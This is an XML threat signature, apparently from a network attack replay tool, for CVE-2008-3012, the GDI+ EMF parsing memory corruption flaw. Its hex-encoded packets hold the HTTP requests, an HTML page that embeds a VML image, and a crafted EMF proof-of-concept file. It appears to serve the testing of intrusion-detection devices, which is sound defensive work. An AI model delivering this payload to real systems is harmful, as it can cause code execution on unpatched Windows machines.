<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="Microsoft Windows Graphics Rendering Engine EMF Parsing Memory Corruption"/>
    <EngDesc display="true" value="A remote code execution vulnerability exists in the way that GDI+ handles parsing of EMF image files. A remote attacker can exploit this vulnerability by enticing the target user to open a crafted EMF file image. Successful exploitation can result in memory corruption which may lead to arbitrary code execution under the credentials of the currently logged in user."/>
    <Intent display="true">
      <item value="MEMORY_CORRUPTION"/>
    </Intent>
    <Protocol display="true" value="HTTP"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="Microsoft"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Microsoft_Microsoft_Digital_Image_Suite"/>
      <item value="Microsoft_Microsoft_Forefront_Client_Security"/>
      <item value="Microsoft_Microsoft_Internet_Explorer"/>
      <item value="Microsoft_Microsoft_Office"/>
      <item value="Microsoft_Microsoft_Office_System"/>
      <item value="Microsoft_Microsoft_PowerPoint_Viewer"/>
      <item value="Microsoft_Microsoft_Report_Viewer"/>
      <item value="Microsoft_Microsoft_SQL_Server"/>
      <item value="Microsoft_Microsoft_Visio"/>
      <item value="Microsoft_Microsoft_Windows"/>
      <item value="Microsoft_Microsoft_Windows_Sever"/>
      <item value="Microsoft_Microsoft_Works"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="Microsoft_Digital_Image_Suite_2006"/>
      <item value="Microsoft_Forefront_Client_Security_1.0"/>
      <item value="Microsoft_Internet_Explorer_6_sp_1"/>
      <item value="Microsoft_Office_2003"/>
      <item value="Microsoft_Office_XP"/>
      <item value="Microsoft_Office_System_2007"/>
      <item value="Microsoft_PowerPoint_Viewer_2003"/>
      <item value="Microsoft_Report_Viewer_2005_Service_Pack_1_Redistributable_Package"/>
      <item value="Microsoft_Report_Viewer_2008_Redistributable_Package"/>
      <item value="Microsoft_SQL_Server_2000_Reporting_Services_Service_Pack_2"/>
      <item value="Microsoft_SQL_Server_2005"/>
      <item value="Microsoft_Visio_2002_Service_Pack_2"/>
      <item value="Microsoft_Windows_2000"/>
      <item value="Microsoft_Windows_Vista"/>
      <item value="Microsoft_Windows_XP"/>
      <item value="Microsoft_Windows_Sever_2003"/>
      <item value="Microsoft_Windows_Sever_2008"/>
    </Known_Versions_Affected>
    <Credit display="true" value="FSC20080909-10"/>
    <CVEID display="true" value="CVE-2008-3012"/>
    <bugtraqID display="true" value="31019"/>
    <OSVDB display="true" value=""/>
    <Author display="true" value="ThreatEx Team"/>
    <ID display="true" value="93551bc6913d11dd98bc000c29da7492"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value="true"/>
    <ServerSideAttack display="true" value=""/>
    <SoftwareRevision display="true" value="2.0"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value="True"/>
    <AccessVector display="false" value="remote"/>
    <AccessComplexity display="false" value="Medium"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="Partial"/>
    <IntegImpact display="false" value="Partial"/>
    <AvailImpact display="false" value="Partial"/>
    <ImpactBias display="false" value="normal"/>
    <FirstAdded display="false" value="normal"/>
    <LastModified display="false" value="633609733762500000"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value="B"/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value="1"/>
    <Regex display="false" value=""/>
    <Created value="1223050894" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="M"/>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="N"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="O"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="P"/>
    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="Q"/>
  </Variables>
  <Loops>
    <for index="D">
      <for index="M"/>
      <for index="N"/>
      <for index="O"/>
      <for index="P"/>
      <for index="Q"/>
    </for>
    <for index="F"/>
    <for index="G">
      <for index="M"/>
      <for index="N"/>
      <for index="O"/>
      <for index="P"/>
      <for index="Q"/>
    </for>
    <for index="H"/>
  </Loops>
  <PostScript/>
  <Output index="D" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="019F" Identification="8DA0" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="0A4E" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="3D256F98" AckNumber="C346175D" HeaderLength="05" WindowSize="FAF0" Checksum="DA02" UrgentPointer="0000" Options="" Payload="474554202F7E6D626F68696F2F706F632E68746D6C20485454502F312E310D0A4163636570743A20696D6167652F6769662C20696D6167652F782D786269746D61702C20696D6167652F6A7065672C20696D6167652F706A7065672C206170706C69636174696F6E2F782D73686F636B776176652D666C6173682C206170706C69636174696F6E2F766E642E6D732D657863656C2C206170706C69636174696F6E2F766E642E6D732D706F776572706F696E742C206170706C69636174696F6E2F6D73776F72642C202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E313B20535631290D0A486F73743A203137322E31362E312E320D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IP>
    </Ethernet>
  </Output>
  <Output index="G" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00E5" Identification="8DA2" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="0B06" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="3D25710F" AckNumber="C3461ABB" HeaderLength="05" WindowSize="F792" Checksum="BF8F" UrgentPointer="0000" Options="" Payload="474554202F7E6D626F68696F2F706F632E656D6620485454502F312E310D0A4163636570743A202A2F2A0D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E313B20535631290D0A486F73743A203137322E31362E312E320D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1,3">
    <Output index="F" Count="">
      <Ethernet srcMac="" destMac="" pktType="0800">
        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0386" Identification="55F3" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="8014" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
          <TCP srcPort="" destPort="" SeqNumber="C346175D" AckNumber="3D25710F" HeaderLength="05" WindowSize="1920" Checksum="5161" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A204672692C2031322053657020323030382031373A35333A353620474D540D0A5365727665723A204170616368652F322E322E33202843656E744F5329205048502F352E312E36206D6F645F707974686F6E2F332E322E3820507974686F6E2F322E342E33206D6F645F7065726C2F322E302E32205065726C2F76352E382E380D0A4C6173742D4D6F6469666965643A204672692C2031322053657020323030382031373A35303A323420474D540D0A455461673A20223333303034322D3165332D34353662363835316162383030220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203438330D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D49534F2D383835392D310D0A0D0A3C48544D4C3E0D0A2020202020203C484541443E0D0A2020202020202020202020203C5354594C453E6173737572656E745C3A2A207B6265686176696F723A2075726C282364656661756C7423564D4C293B20646973706C61793A696E6C696E652D626C6F636B3B7D3C2F5354594C453E0D0A2020202020202020202020203C584D4C3A6E616D657370616365206E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A766D6C22207072656669783D226173737572656E7422202F3E0D0A2020202020203C2F484541443E0D0A2020202020203C424F44593E0D0A2020202020203C62723E0D0A202020202020436F70797269676874204173737572656E742053656375726520546563686E6F6C6F676965732C20612054656C757320436F6D70616E793C62723E0D0A202020202020416C6C20526967687473205265736572766564203C62723E3C62723E0D0A0D0A2020202020202020202020203C6173737572656E743A52454354207374796C653D2277696474683A313030253B206865696768743A313030253B223E3C6173737572656E743A494D41474544415441207372633D22706F632E656D66223E3C2F6173737572656E743A524543543E0D0A2020202020203C2F424F44593E0D0A3C2F48544D4C3E0D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IP>
      </Ethernet>
    </Output>
    <Output index="H" Count="">
      <Ethernet srcMac="" destMac="" pktType="0800">
        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="04B6" Identification="55F4" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="7EE3" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
          <TCP srcPort="" destPort="" SeqNumber="C3461ABB" AckNumber="3D2571CC" HeaderLength="05" WindowSize="1D50" Checksum="F487" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A204672692C2031322053657020323030382031373A35333A353620474D540D0A5365727665723A204170616368652F322E322E33202843656E744F5329205048502F352E312E36206D6F645F707974686F6E2F332E322E3820507974686F6E2F322E342E33206D6F645F7065726C2F322E302E32205065726C2F76352E382E380D0A4C6173742D4D6F6469666965643A204672692C2031322053657020323030382031373A35303A323420474D540D0A455461673A20223333303037352D3332342D34353662363835316162383030220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203830340D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D39390D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20766964656F2F756E6B6E6F776E0D0A0D0A010000006C000000FFFFFFFFFFFFFFFFC0030000D0020000B03CFFFFB03CFFFF50C3000050C3000020454D4600000100240300001600000002000000000000000000000000000000000400000003000040010000F000000000000000000000000000000000E2040080A90300460000002C00000020000000454D462B014001001C000000100000000110C0DB01000000600000006000000046000000C4000000B8000000454D462B084000022C000000200000000110C0DB000000000000000000000000000040400110C0DB00000000008000FF08400103780000006C0000000110C0DB0A000000000000000000204100002041000016440000A041000000000000C0FF0000164400002042000020410000484200001644000070420000204100008C42000016440000A042000020410000B442000000000000C0FF00010101010101010181000000000000154001001000000004000000000000002100000008000000620000000C000000010000003A0000000C0000000A00000024000000240000000000803D00000000000000000000803D0000000000000000020000005F00000038000000010000003800000000000000380000000000000000220100300000000000000000800000000000000000000000000000250000000C00000001000000250000000C000000050000803B000000080000001B00000010000000210300002103000058000000340000000000000000000000FFFFFFFFFFFFFFFF060000004006900154005400A00F2003C0124006E015800CA00FA00F3D000000080000003C000000080000004000000018000000ECFFFFFFECFFFFFF7701000013010000240000002400000000008041000000000000000000008041000000000000000002000000280000000C000000010000003A0000000C0000000A0000004C00000064000000F7FFFFFFF7FFFFFF6C01000008010000F7FFFFFFF7FFFFFF76010000120100002900AA0000000000000000000000803F00000000000000000000803F0000000000000000000000000000000000000000000000000000000000000000220000000C000000FFFFFFFF0E00000014000000000000001000000014000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IP>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
